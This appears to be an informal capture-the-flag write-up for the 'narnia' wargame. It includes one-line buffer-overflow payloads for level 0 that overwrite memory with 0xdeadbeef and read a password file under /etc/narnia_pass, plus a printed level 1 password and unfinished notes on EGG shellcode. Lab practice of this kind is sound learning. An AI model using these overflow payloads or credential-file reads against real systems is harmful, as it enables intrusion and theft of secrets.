

narnia seems to have 9 levels, narnia 0 .. 9.
Unlike in prior games, every level seems to involve an executable these are stored at `/narnia`, only the level specific one and its respective source code is accesible to the current user.

## level 0

as always the credentials of the frist level were given freely.
username: narnia0
password: narnia0

### solution

I had to look up how to get the shell to react the first time I did this, my final command is as below 

`(perl -e 'print "0"x20 . "\xef\xbe\xad\xde"'; echo "cat /etc/narnia_pass/narnia1") | ./narnia0`

my better solution which I used to the second time I tried this is as follows:

`(python -c "print '123456789012345678\x00\x00\xef\xbe\xad\xde'" && cat) | ./narnia0`


## level 1

username: narnia1
password: efeidiedae


For this one you've gotta insert something into the env var EGG, the program will then read it and try to execute it.

assumptions and decutions
- EGG has to be a pointer to a location in memory
- The program is already compiled so EGG has to be in binary like with narnia 0
- Using gdb I was able to get a function on the stack to run, or at least I managed to get a floating point error when inserting an address that is on the stack (instead of a segfault or an "illegal operation).
- it might just be running OP codes??? tbh I got no idea, do moar research by running it locally and modifying the file.

I was able to look into the memory, and doing ASM like this is a mess.

### solution

## level 2
